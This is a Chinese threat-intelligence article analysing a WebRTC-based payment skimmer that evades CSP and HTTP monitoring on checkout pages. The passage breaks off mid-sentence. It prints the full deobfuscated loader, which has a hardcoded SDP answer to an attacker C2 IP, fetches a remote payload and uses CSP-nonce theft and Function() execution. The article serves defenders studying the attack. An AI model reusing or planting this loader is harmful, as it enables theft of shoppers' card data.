---
title: WebRTC型支付盗刷脚本技术分析
url: https://mp.weixin.qq.com/s/ziTQg0mv7DfodpHIqu9oWA
source: Doonsec's feed
date: 2026-03-28
fetch_date: 2026-03-29T04:40:52.168507
---

# WebRTC型支付盗刷脚本技术分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibO9kiauylaDrTSHvQZhV8q05ob1QdUYibQcOeRqvWgH732uUIDianUfqNvnJ4XU5uqEFhsiaTyMf9ibxib33BqKdE0jHpjwTY21OticN6cBCwIj9icY/0?wx_fmt=jpeg)

# WebRTC型支付盗刷脚本技术分析

白帽子

![]()

在小说阅读器中沉浸阅读

以下文章来源于黑鸟
，作者黑鸟

![](http://wx.qlogo.cn/mmhead/X4XEGYefSBSxrDYncLtKiacf7vZpHQnuLDMVc1rQjZsw9xYSM6kSCezibImssYuBjTibclnyop737M/0)

**黑鸟**
.

一介草民，深耕威胁情报领域多年，自封威胁分析师，APT狩猎者，战略忽悠分析师。 专注推送一切前沿高科技/人工智能、网络安全分析、敌我战略分析、数据挖掘、情报扩线、网络武器分析、社会工程学、一切开源情报、军事分析忽悠等。

全球首例利用 WebRTC 数据通道作为核心通信信道的支付盗刷恶意脚本在近期被公开，该脚本成功绕过一家市值超千亿美元车企的全链路安全防护，完成恶意载荷注入与支付数据窃取。

本次攻击并非孤立事件。过去两个月内，类似攻击已在 5 家市值数十亿美元的头部企业站点发现同类盗刷器，受害者包括美国排名前三的银行、全球排名前十的连锁超市，涉事车企是该系列攻击的最新受害者。

攻击者通过自动化扫描，发现存在 PolyShell 漏洞（Adobe Commerce 的未授权文件上传漏洞）的电商站点，利用漏洞向站点上传本次的 WebRTC 初始注入脚本，完成站点入侵。

初始注入脚本被植入到站点的支付页面、结账页面等敏感页面中，用户访问时自动执行，实现长期驻留。脚本执行后，通过 WebRTC 与攻击者 C2 服务器建立加密连接，上报当前页面 URL，接收第二阶段的盗刷核心载荷。盗刷载荷执行后，劫持页面的支付表单，实时窃取用户输入的信用卡号、有效期、CVV 码、姓名、地址等敏感支付信息。窃取的支付数据，通过加密的 WebRTC 数据通道直接外传至攻击者 C2 服务器，全程无 HTTP 请求，绕过所有安全防护。

攻击核心特性

本次攻击与传统支付盗刷攻击的核心区别，是彻底摒弃了传统恶意脚本依赖的 HTTP 请求、图片信标等通信方式，全程通过 WebRTC 数据通道完成两大核心恶意操作。

一是从攻击者命令与控制服务器接收第二阶段盗刷核心载荷，二是将受害者页面窃取的支付卡数据、个人敏感信息通过加密 WebRTC 通道外传。

这是安全行业首次观测到 WebRTC 技术被完整用于支付盗刷攻击全链路，核心危害是可同时绕过当前 Web 安全领域两大核心防护体系，分别是内容安全策略与所有基于 HTTP/HTTPS 的流量检测工具。

WebRTC 全称网页实时通信，是由 W3C 与 IETF 联合制定的开放行业标准，原生内置在所有主流浏览器中，无需任何插件即可实现。其原生设计目标是让浏览器与终端设备无需中间中转服务器，即可实现点对点音视频通话、任意格式数据的实时双向传输，广泛应用于视频会议、在线直播、实时客服、文件传输、在线游戏等场景。

![](https://mmbiz.qpic.cn/mmbiz_png/ibO9kiauylaDqQhHA90CMOjib3VSfB0S42rXXgnfe5vKibicg7hHkZdlb8VS6MSXOXvJwly1ic36Vm8CRDdb9Q9GeVLEagvf9Ko91GxzNtQq6iatcQ/640?wx_fmt=png&from=appmsg)

### 攻击核心绕过逻辑

WebRTC 能实现全面防护绕过，核心源于三大原生特性。

一是 CSP 规范的原生管控缺口，WebRTC 对等连接完全运行在 CSP 管控范围之外，CSP 中的 connect-src 指令仅能管控 fetch、XHR、WebSocket 等传统 Web 网络请求，完全无法限制 WebRTC 核心连接 API，即便站点配置了严格 CSP 策略拦截所有未授权 HTTP 连接，面对 WebRTC 攻击仍无防御能力。

二是标准支持的行业空白，Chrome 浏览器仅为 WebRTC 相关的 CSP 管控指令提供实验性支持，该指令尚未完成 W3C 标准化，全球范围内几乎没有商业站点完成部署，该绕过方式对绝大多数电商、金融站点完全有效。三是流量检测的天然盲区，WebRTC 数据通道的流量基于 DTLS 加密的 UDP 协议传输，而非 HTTP 协议，所有用于检测审计 HTTP 流量的网络安全设备，完全无法捕获解析被盗数据的外传行为。

### 攻击相关核心组件

| 核心组件 | 正常功能定位 | 攻击相关核心原生特性 | 本次攻击中的滥用方式 |
| --- | --- | --- | --- |
| RTCPeerConnection | WebRTC 核心顶层 API，负责建立维护关闭浏览器与对等端之间的点对点连接，是所有 WebRTC 通信的基础 | 原生脱离浏览器 HTTP 请求体系，独立建立网络连接。不受 CSP 内容安全策略管控。可直接向任意 IP 与端口发起 UDP 连接 | 恶意脚本通过该 API 直接与攻击者 C2 服务器建立加密连接，作为所有恶意通信的基础载体 |
| RTCDataChannel | 基于 RTCPeerConnection 建立的双向数据传输通道，支持传输字符串、二进制等任意格式数据，具备低延迟、高可靠性、强制端到端加密的特性 | 数据传输全程基于 DTLS 加密，仅通信双方可解密。传输基于 UDP 协议，无 HTTP 协议特征。可自定义通道名称，附带额外信息 | 作为攻击的唯一核心通信信道，替代传统 HTTP 请求，全程用于接收第二阶段恶意载荷、外传窃取的支付卡等敏感数据 |
| SDP 会话描述协议 | 纯文本格式的会话配置文件，包含对等端的 IP 地址、端口、加密方式、ICE 认证凭证、DTLS 指纹等所有连接必需的参数，WebRTC 通过请求与应答的双向交换完成连接协商 | 支持手动修改自定义所有配置参数，无需浏览器自动生成 | 攻击者硬编码完整的 SDP 应答配置，完全跳过正常 WebRTC 必需的信令服务器，实现浏览器与 C2 服务器的直连 |
| ICE 交互式连接建立 | 解决 NAT 穿透问题的核心协议，通过 ICE 用户名片段和 ICE 密码完成连接双方的身份认证，是 WebRTC 连接建立的前置条件 | 支持预共享固定的认证凭证，无需动态协商生成 | 攻击者硬编码固定的 ICE 用户名与密码，实现与 C2 服务器的预认证，无需动态协商即可完成身份校验与连接建立 |
| DTLS 数据报传输层安全协议 | TLS 协议的 UDP 适配版本，是 WebRTC 强制启用的加密标准，为 WebRTC 流量提供端到端的加密保护，防止流量被窃听篡改 | 强制端到端加密，中间设备无法解密流量内容。基于 UDP 协议运行，无 TCP 的握手与报文特征 | 加密恶意载荷与窃取数据的传输，让中间网络安全设备无法解析流量内容，彻底规避基于特征的流量检测 |
| STUN/TURN 协议 | 用于 WebRTC 的 NAT 穿透与中继服务，标准端口为 UDP 3478 与 3479 | 绝大多数企业防火墙为保证正常 WebRTC 应用可用，默认放行该端口的 UDP 流量 | 攻击者使用 UDP 3479 端口作为 C2 通信端口，可直接穿透企业防火墙，无需额外开放端口 |

###

正常 WebRTC 点对点连接，需遵循固定完整流程。

对等端 A 创建 RTCPeerConnection 实例，生成 SDP 连接请求配置。对等端 A 通过信令服务器，将 SDP 连接请求发送给对等端 B。

对等端 B 接收 SDP 连接请求后，生成对应的 SDP 连接应答配置。对等端 B 再次通过信令服务器，将 SDP 连接应答回传给对等端 A。

双方交换 SDP 后，通过 ICE 协议完成 NAT 穿透与身份认证，完成 DTLS 加密握手。加密连接建立完成，双方通过 RTCDataChannel 实现双向数据传输。

正常 WebRTC 连接必须依赖信令服务器完成 SDP 的双向交换，两个对等端初始无法获知对方的网络地址、连接参数与加密配置，必须通过中转的信令服务器完成信息同步。

![](https://mmbiz.qpic.cn/mmbiz_png/ibO9kiauylaDrVkKyibrQc2cEtIMR9ia8oUa6Zyg713ibiczfH2r7PiacHjH9PMATnnuoQ9gmfWLibEcF84wqO57z8qwU6hzFs6qzokehOIx0jrY5Wc/640?wx_fmt=png&from=appmsg)

### WebRTC 与传统 HTTP 通信核心差异

| 对比维度 | 传统 HTTP/HTTPS 通信 | WebRTC DataChannel 通信 |
| --- | --- | --- |
| 底层传输协议 | TCP 协议，需三次握手建立连接，有明确的请求响应结构 | UDP 协议，无连接状态，无固定的报文结构 |
| 安全管控范围 | 完全纳入 CSP 内容安全策略管控，connect-src 可限制可访问的域名与 IP | 完全脱离 CSP 管控范围，浏览器原生不对其做域名与 IP 限制 |
| 流量加密方式 | TLS 加密，中间代理设备可通过证书安装实现流量解密与审计 | DTLS 端到端加密，仅通信双方可解密，中间设备无法解析内容 |
| 流量检测适配 | 所有 WAF、IDS、IPS 均原生支持 HTTP 流量解析、特征匹配与威胁拦截 | 绝大多数安全设备无 UDP 流量的深度解析能力，无法识别 WebRTC 传输的恶意内容 |
| 端口使用 | 固定使用 TCP 80 与 443 端口，有明确的应用层协议特征 | 标准使用 UDP 3478 与 3479 端口，无 HTTP 应用层特征 |

##

## 攻击技术细节拆解

### 完整反混淆恶意代码如下

```
(function () {  // 初始化WebRTC对等连接与核心变量  var conn = new window.RTCPeerConnection();  var channel = conn.createDataChannel(location.href);  var chunks = [];  var executed = false;  // 接收攻击者下发的恶意载荷，分块存储  channel.onmessage = function (event) {    chunks.push(      typeof event.data == "string"        ? event.data        : new TextDecoder().decode(event.data),    );  };  // 数据通道关闭时，执行拼接后的恶意载荷  channel.onclose = function () {    executePayload();    conn.close();  };  // 生成随机ICE用户名片段，用于与C2服务器的身份认证  var iceUfrag = Math.random().toString(36).slice(2, 10);  // 生成SDP连接请求，替换硬编码的ICE认证凭证  conn    .createOffer()    .then(function (offer) {      offer.sdp = offer.sdp        .replace(RegExp("a=ice-ufrag:.+", "g"), "a=ice-ufrag:" + iceUfrag)        .replace(          RegExp("a=ice-pwd:.+", "g"),          "a=ice-pwd:05l0TstonL9bYAdB04I6x2",        );      return conn.setLocalDescription(offer);    })    // 硬编码SDP应答，跳过信令服务器，直连C2服务器    .then(function () {      var c2ip = [202, 181, 177, 177].join(".");      conn.setRemoteDescription({        type: "answer",        sdp:          "v=0\r\no=- 0 0 IN IP4 0.0.0.0\r\n" +          "s=-\r\nt=0 0\r\n" +          "a=group:BUNDLE 0\r\n" +          "a=ice-ufrag:" +          iceUfrag +          "\r\n" +          "a=ice-pwd:JxCvVg2YnHDqAcpPS8mkqC\r\n" +          "a=fingerprint:sha-256 9E:BB:2A:E2:C5:B8:DC:0A:8B:A7:" +          "85:E1:9F:C4:F8:A8:09:2A:F4:1E:70:30:1B:AF:9F:26:97:" +          "BE:E2:6E:E3:1D\r\n" +          "a=setup:passive\r\n" +          "m=application 3479 UDP/DTLS/SCTP webrtc-datachannel\r\n" +          "c=IN IP4 " +          c2ip +          "\r\n" +          "a=mid:0\r\na=sctp-port:5000\r\n" +          "a=candidate:1 1 UDP 1803930525 " +          c2ip +          " 3479 typ host\r\n",      });    });  // 10秒超时兜底，无论载荷是否接收完成，强制执行恶意代码  setTimeout(function () {    executePayload();    conn.close();  }, 1e4);  // 核心载荷执行函数，实现多路径CSP绕过  function executePayload() {    // 防止重复执行    if (executed) {      return;    }    executed = true;    // 拼接所有分块的恶意载荷    var payload = chunks.join("");    // 利用浏览器空闲时段执行，规避性能检测    (      window.requestIdleCallback ||      function (fn) {        setTimeout(fn, 50);      }    )(function () {      try {        // 首选方案：窃取页面合法CSP nonce值，绕过nonce-based CSP        var script = document.createElement("script");        var scripts = document.querySelectorAll("script");        var i;        // 遍历页面所有已有script标签，查找合法nonce值        for (i = 0; i < scripts.length; i = i + 1) {          if (scripts[i].nonce) {            script.nonce = scripts[i].nonce;            inject();            return;          }        }        // 兜底方案1：通过Function构造器执行，适配unsafe-eval场景        try {          Function(payload)();        } catch (e) {          inject();        }        // 兜底方案2：直接注入DOM，适配unsafe-inline场景        function inject() {          script.textContent = payload;          document.head.appendChild(script);          script.remove();        }      } catch (e) {}    });  }})();
```

####

核心操作是创建 RTCPeerConnection 实例，初始化 WebRTC 对等连接，同时创建数据传输通道，通道名称设置为当前页面的完整 URL。初始化数组用于存储分块接收的载荷，设置标记防止载荷重复执行。

该设计可让攻击者 C2 服务器通过通道名称，直接判断用户当前是否处于支付、结账、填写银行卡信息的敏感页面，针对性下发盗刷核心载荷，同时统计被注入的站点与页面范围，避免载荷重复执行造成页面异常被用户察觉。

伪造 SDP 握手与 C2 服务器直连是本次攻击最具突破性的技术设计。

攻击者先生成随机的 ICE 用户名片段，将浏览器自动生成的 SDP 连接请求中的 ICE 密码，替换为硬编码的固定值，保证与 C2 服务器的认证凭证匹配。随后完全在本地硬编码完整的 SDP 连接应答，其中包含攻击者 C2 服务器的固定 IP、UDP 通信端口、预共享的 DTLS 加密指纹、匹配的 ICE 服务器密码，加载到浏览器的 WebRTC 连接中。

浏览器的相关 API 并未限制 SDP 的来源，允许手动传入任意自定义的 SDP 配置。攻击者利用这一特性，完全跳过了信令服务器环节，浏览器会直接根据硬编码的 SDP 配置，向攻击者 C2 服务器发起 UDP 连接，完成 ICE 认证与 DTLS 加密握手，建立端到端的加密数据通道，彻底消除了信令服务器的暴露风险。

脚本存在分块载荷接收与双触发执行机制，通过消息监听事件持续接收 C2 服务器下发的数据，将每一个数据块存入数组，同时兼容字符串与二进制格式的数据，通过文本解码器完成解码。

分块传输可规避 WebRTC 单消息的大小限制，支持传输大体积的盗...